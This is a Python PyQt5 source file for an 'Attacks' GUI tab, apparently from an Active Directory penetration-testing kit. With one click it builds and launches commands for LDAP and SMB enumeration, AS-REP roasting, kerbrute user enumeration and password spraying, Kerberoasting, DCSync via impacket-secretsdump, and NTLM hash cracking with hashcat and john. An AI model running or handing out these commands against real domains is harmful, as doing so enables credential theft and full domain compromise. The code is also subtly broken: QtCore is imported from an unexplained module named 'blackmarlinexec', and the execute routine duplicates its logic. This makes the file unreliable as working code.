import os
import subprocess
import shutil
import pyperclip
from PyQt5.QtWidgets import (
    QApplication, QVBoxLayout, QWidget, QPushButton,
    QLabel, QMessageBox, QSplitter, QHBoxLayout, 
    QComboBox
)
from blackmarlinexec.QtCore import QTimer, QEvent, Qt
from PyQt5.QtGui import QFont
QApplication.setFont(QFont('Arial', 10))



class Attacks(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
    
    
    def initUI(self):
        # Main layout
        self.layout = QVBoxLayout(self)

        # Stylish labels for Enum and Attack
        self.enumLabel = QLabel("Enum")
        self.attackLabel = QLabel("Attack")
        self.enumLabel.setFixedHeight(50)
        self.attackLabel.setFixedHeight(50)
        self.enumLabel.setStyleSheet("background-color: black; color: #F1BA00; font-size: 18px; font-weight: bold;")
        self.attackLabel.setStyleSheet("background-color: black; color: #F1BA00; font-size: 18px; font-weight: bold;")


        # IP Address Dropdown Field
        self.ipAddressCombo = QComboBox()
        self.ipAddressLabel = QLabel("IP Address:")
        ipAddressLayout = QHBoxLayout()
        ipAddressLayout.addWidget(self.ipAddressLabel)
        ipAddressLayout.addWidget(self.ipAddressCombo)
        self.layout.addLayout(ipAddressLayout)

        # Splitter for dividing the layout horizontally
        self.splitter = QSplitter(Qt.Horizontal)

        # Left and right side layouts
        leftLayout = QVBoxLayout()
        rightLayout = QVBoxLayout()
        leftLayout.addWidget(self.enumLabel)
        rightLayout.addWidget(self.attackLabel)

        # Create panels for the left and right sides
        leftSide = QWidget()
        rightSide = QWidget()
        leftSide.setLayout(leftLayout)
        rightSide.setLayout(rightLayout)

        # Add attacks to the left side
        self.addAttack(leftLayout, "ldap-search", "1")
        self.addAttack(leftLayout, "enum4linux", "2")
        self.addAttack(leftLayout, "GetNPUsers", "3")
        self.addAttack(leftLayout, "snmpwalk 161udp", "4")
        self.addAttack(leftLayout, "kerbrute userenum", "5")


        # Add attacks to the right side
        self.addAttack(rightLayout, "Kerberoasting", "6")
        self.addAttack(rightLayout, "Password Spray", "7")
        self.addAttack(rightLayout, "DCsync Attack", "8")
        self.addAttack(rightLayout, "Crack NTLM hash Hashcat", "9")
        self.addAttack(rightLayout, "Crack NTLM hash John", "10")


        # Add left and right sides to the splitter
        self.splitter.addWidget(leftSide)
        self.splitter.addWidget(rightSide)

        # Add the splitter to the main layout
        self.layout.addWidget(self.splitter)

        # Usernames, passwords, and hashes layout
        credentialsLayout = QHBoxLayout()
        usernamesLabel = QLabel("Usernames:")
        self.usernameCombo = QComboBox()
        passwordsLabel = QLabel("Passwords:")
        self.passwordCombo = QComboBox()
        hashesLabel = QLabel("Hashes:")
        self.hashesCombo = QComboBox()

        # Add widgets to the credentialsLayout
        credentialsLayout.addWidget(usernamesLabel)
        credentialsLayout.addWidget(self.usernameCombo)
        credentialsLayout.addWidget(passwordsLabel)
        credentialsLayout.addWidget(self.passwordCombo)
        credentialsLayout.addWidget(hashesLabel)
        credentialsLayout.addWidget(self.hashesCombo)

        # Load usernames, passwords, and hashes
        self.loadUsernames()
        self.loadPasswords()
        self.loadHashes()

        # Add the label above the last line
        aboveLastLabel = QLabel("Select User and Password (Only for command 6 & 7 & 8) Select hash (Only for command 9 & 10)")
        aboveLastLabel.setFixedHeight(50)
        aboveLastLabel.setStyleSheet("background-color: black; color: #F1BA00; font-size: 14px; font-weight: bold;")
        self.layout.addWidget(aboveLastLabel)


        # Add credentials layout to the main layout
        self.layout.addLayout(credentialsLayout)
        self.updateDropdownStyle()
        
        
    def showEvent(self, event):
        super().showEvent(event)
        
       
        if event.type() == QEvent.Show:
            self.loadIPAddresses()
            self.loadUsernames()
            self.loadPasswords()
            self.loadHashes()

    def addAttack(self, layout, name, commandNumber):
        # Horizontal layout for each attack
        attackLayout = QHBoxLayout()

        # Label for the attack name
        attackLabel = QLabel(name)
        attackLabel.setAlignment(Qt.AlignCenter)

        # Button to execute the attack
        executeButton = QPushButton("Execute")
        executeButton.clicked.connect(lambda: self.executeAttack(commandNumber, executeButton))

        # Button to copy the command
        copyButton = QPushButton("Copy Command")
        copyButton.clicked.connect(lambda: self.copyCommand(commandNumber, copyButton))

        # Set tooltip for the copy button
        executeButton.setToolTip(self.getTooltipForCommand(commandNumber))

        # Add components to the attack layout
        attackLayout.addWidget(attackLabel)
        attackLayout.addWidget(executeButton)
        attackLayout.addWidget(copyButton)

        # Add the attack layout to the main layout
        layout.addLayout(attackLayout)

    

    def executeAttack(self, commandNumber, button):
          # Check if the username or password is "Select One"
        username_value = self.usernameCombo.currentText()
        password_value = self.passwordCombo.currentText()
        hash_value = self.hashesCombo.currentText()
        # For command number "3", ensure that a domain is provided
        if commandNumber == "3" or commandNumber == "5" or commandNumber == "6" or commandNumber == "7" or commandNumber == "8":
            domain = self.getDomain()
            if not domain:
                QMessageBox.warning(self, 'Error', 'This command requires a domain. Please specify a domain in Hosts tab.')
                self.resetButtonAppearance(button, "Execute")
                return  # Stop execution if domain is required but not provided

        # Additional check for command number "4" for the existence of the file
        if commandNumber == "4":
            if not os.path.exists('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'):
                QMessageBox.warning(self, 'Error', 'The required file does not exist. Please install seclists with: apt install seclists')
                self.resetButtonAppearance(button, "Execute")
                return  # Stop execution if the file does not exist
        if commandNumber == "6" or commandNumber == "8":     
            if username_value == "Select One" or password_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a valid username and password.')
                self.resetButtonAppearance(button, "Execute")
                return 
        if commandNumber == "7":     
            if password_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a valid password.')
                self.resetButtonAppearance(button, "Execute")
                return     
        if commandNumber == "9" or commandNumber == "10":     
            if hash_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a hash!.')
                self.resetButtonAppearance(button, "Execute")
                return     
        
        command = self.constructCommand(commandNumber)
        if command != "Unknown Command":
            self.updateButtonAppearance(button, "Executed", "green")
            QTimer.singleShot(1000, lambda: self.resetButtonAppearance(button, "Execute"))
            self.launchInTerminal(command)
        else:
            QMessageBox.warning(self, 'Error', 'Unknown command number provided.')


        command = self.constructCommand(commandNumber)
        self.updateButtonAppearance(button, "Executed", "green")
        QTimer.singleShot(1000, lambda: self.resetButtonAppearance(button, "Execute"))
        #self.launchInTerminal(command)

    def copyCommand(self, commandNumber, button):
        hash_value = self.hashesCombo.currentText()
        if commandNumber == "9" or commandNumber == "10":     
            if hash_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a hash!.')
                self.resetButtonAppearance(button, "Copy Command")
                return 
        username_value = self.usernameCombo.currentText()
        password_value = self.passwordCombo.currentText()
        if commandNumber == "6" or commandNumber == "8":     
            if username_value == "Select One" or password_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a valid username and password.')
                self.resetButtonAppearance(button, "Copy Command")
                return 
        if commandNumber == "7":     
            if password_value == "Select One":
                QMessageBox.warning(self, 'Error', 'Please select a valid password.')
                self.resetButtonAppearance(button, "Copy Command")
                return   
        if commandNumber == "3" or commandNumber == "5" or commandNumber == "6" or commandNumber == "7" or commandNumber == "8":
            domain = self.getDomain()
            if not domain:
                QMessageBox.warning(self, 'Error', 'This command requires a domain. Please specify a domain in Hosts tab.')
                self.resetButtonAppearance(button, "Copy Command")
                return   
        
        command = self.constructCommand(commandNumber)
        pyperclip.copy(command)
        print(f"Command copied: {command}")
        self.updateButtonAppearance(button, "Copied", "green")
        QTimer.singleShot(1000, lambda: self.resetButtonAppearance(button, "Copy Command"))

    def constructCommand(self, commandNumber):
        target_ip = self.ipAddressCombo.currentText()
        domain = self.getDomain()
        # Retrieve selected username and password
        username = self.usernameCombo.currentText()
        password = self.passwordCombo.currentText()
        hash = self.hashesCombo.currentText()
        # Define commands based on the commandNumber
        if commandNumber == "1":
            return f"nmap -n -sV --script 'ldap* and not brute' {target_ip}"
        elif commandNumber == "2":
            return f"enum4linux {target_ip}"
        elif commandNumber == "3":
            if domain:
                return f"impacket-GetNPUsers {domain}/ -usersfile /usr/share/adsuit/usernames.txt -dc-ip {target_ip} -request -format john"
            else:
               print("Please specefy a domain using hosts tab to use this command")
        elif commandNumber == "4":
             return f"snmpwalk -Os -c public -v 1 '{target_ip}'"
        elif commandNumber == "5":
            return f"/usr/share/adsuit/kerbrute_linux_amd64 userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}"
        
        elif commandNumber == "6":
            return f"impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target_ip} -request"
        
        elif commandNumber == "7":
            return f"/usr/share/adsuit/kerbrute_linux_amd64 passwordspray --dc {target_ip} -d {domain} /usr/share/adsuit/usernames.txt {password}"

        elif commandNumber == "8":
            return f"impacket-secretsdump -just-dc {domain}/{username}:{password}@{target_ip}"
        
        elif commandNumber == "9":
            return f"hashcat -m 1000 {hash} /usr/share/wordlists/rockyou.txt"
        
        elif commandNumber == "10":
            return f"echo '{hash}' > /usr/share/adsuit/hash.txt && john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt /usr/share/adsuit/hash.txt && rm /usr/share/adsuit/hash.txt"


        return "Unknown Command"

    def updateButtonAppearance(self, button, text, color):
        button.setText(text)
        button.setStyleSheet(f"background-color: {color}; color: white;")

    def resetButtonAppearance(self, button, original_text):
        button.setText(original_text)
        button.setStyleSheet("")  # Reset the style to default

    def loadIPAddresses(self, event=None):
        self.ipAddressCombo.clear()  # Clear the dropdown
        try:
            with open('/usr/share/adsuit/hosts.txt', 'r') as file:
                ip_addresses = [line.strip() for line in file.readlines() if line.strip()]
                self.ipAddressCombo.addItems(ip_addresses)
        except FileNotFoundError:
            QMessageBox.warning(self, 'Error', 'Could not find the /usr/share/adsuit/hosts.txt file.')

   


    def updateDropdownStyle(self):
        dropdownStyle = """
        QComboBox::item {
            color: black; /* Ensuring text is always visible */
            background-color: white; /* Default background */
        }
        QComboBox::item:hover {
            background-color: white; /* Green background for hover */
            color: white; /* White text for contrast */
        }
        """
        self.ipAddressCombo.setStyleSheet(dropdownStyle)
        self.usernameCombo.setStyleSheet(dropdownStyle)
        self.passwordCombo.setStyleSheet(dropdownStyle)
        self.hashesCombo.setStyleSheet(dropdownStyle)

    def detect_terminal(self):
        terminals = ['qterminal', 'gnome-terminal', 'xterm', 'konsole']
        for terminal in terminals:
            if shutil.which(terminal):
                return terminal
        return None

    def launchInTerminal(self, command):
        terminal = self.detect_terminal()
        if not terminal:
            QMessageBox.warning(self, 'Error', 'No known terminal found. Please install a terminal emulator.')
            return
        print(command)
        subprocess.Popen([terminal, '-e', 'bash', '-c', command + '; read -p "Press Enter to exit..."'])

    def getDomain(self):
        try:
            with open('/usr/share/adsuit/domain.txt', 'r') as file:
                domain = file.read().strip()
                return domain
        except FileNotFoundError:
            QMessageBox.warning(self, 'Error', 'Could not find the /usr/share/adsuit/domain.txt file.')
            return None

  
    def loadUsernames(self):
       
        self.usernameCombo.clear()
        self.usernameCombo.addItem("Select One")
        try:
            with open('/usr/share/adsuit/usernames.txt', 'r') as file:
                usernames = [line.strip() for line in file.readlines() if line.strip()]
                self.usernameCombo.addItems(usernames)
        except Exception as e:
            print("Error loading usernames:", e)

    def loadPasswords(self):
        
        self.passwordCombo.clear()
        self.passwordCombo.addItem("Select One")
        try:
            with open('/usr/share/adsuit/passwords.txt', 'r') as file:
                passwords = [line.strip() for line in file.readlines() if line.strip()]
                self.passwordCombo.addItems(passwords)
        except Exception as e:
            print("Error loading passwords:", e)


    def loadHashes(self):
        self.hashesCombo.clear()
        self.hashesCombo.addItem("Select One")
        try:
            with open('/usr/share/adsuit/hashes.txt', 'r') as file:
                hashes = [line.strip() for line in file.readlines() if line.strip()]
                self.hashesCombo.addItems(hashes)
        except Exception as e:
            print("Error loading hashes:", e)
        

    def getTooltipForCommand(self, commandNumber):
    # Define tooltips for each command
        tooltips = {
            "1": "The ldap-search NSE script in Nmap typically returns:\n"
                "1. User and Group Information: Details of users and groups in the directory.\n"
                "2. Organizational Details: Information about the organization's structure.\n"
                "3. Object Attributes: Various attributes of directory objects.\n"
                "4. Security Data: Information related to security settings and policies, if accessible.",
            "2": "enum4linux is used to enumerate information from Windows and Samba systems and typically returns:\n"
                "1. Shares: Lists available shares on the target system.\n"
                "2. Users: Enumerates users on the system.\n"
                "3. Groups: Enumerates groups on the system.\n"
                "4. Password Policy: Details of the password policy.\n"
                "5. OS Information: Determines the target's operating system and version.\n"
                "6. SID Security Identifier: Enumerates the security ID of the target.",
            "3": "Impacket-GetNPUsers attempts to list and get non-preauthenticating users (allows for AS-REP roasting) from a domain with john format",
            "4": "snmpwalk is used to perform SNMP queries to retrieve a tree of information from a target system. It needs port 161 udp to be open\n"
                    "It typically returns:\n"
                    "1. System Information: General details about the system.\n"
                    "2. Network Interfaces: Information on network interfaces.\n"
                    "3. IP Routing Information: Details of IP routing table.\n"
                    "4. TCP/UDP Listener Endpoints: Active TCP and UDP connections.\n"
                    "5. SNMP Variables: Values of SNMP variables.",
            "5": "kerbrute userenum is a security tool for Kerberos pre-authentication enumeration.\n"
                            "It typically returns:\n"
                            "1. Valid Usernames: Identifies valid domain usernames by testing for Kerberos pre-authentication.\n"
                            "2. User Enumeration: Can detect users with pre-authentication disabled, useful for AS-REP roasting attacks.",
            "6": "Kerberoasting: Attack to extract service account hashes from a target Domain Controller by requesting TGS tickets for service accounts.",
            "7": "Password Spray: Attack to attempt a single password against multiple usernames using kerbrute passwordspray, useful for guessing weak passwords.\nSelect one password and ignore username selection because all usernames are going to be used.",
            "8": "DCsync Attack: Mimics a Domain Controller to retrieve password hashes and other sensitive data from Active Directory using the DRS Remote Protocol.",
            "9": "Crack NTLM Hash with Hashcat: Uses Hashcat to crack NTLM password hashes. It tries numerous combinations using a specified hash and a common password dictionary. rockyou.txt wordlist is used",
            "10": "Crack NTLM Hash with John the Ripper: Employs John the Ripper for cracking NTLM hashes by applying various password-cracking techniques. rockyou.txt wordlist is used"
    }
        return tooltips.get(commandNumber, "Unknown command")

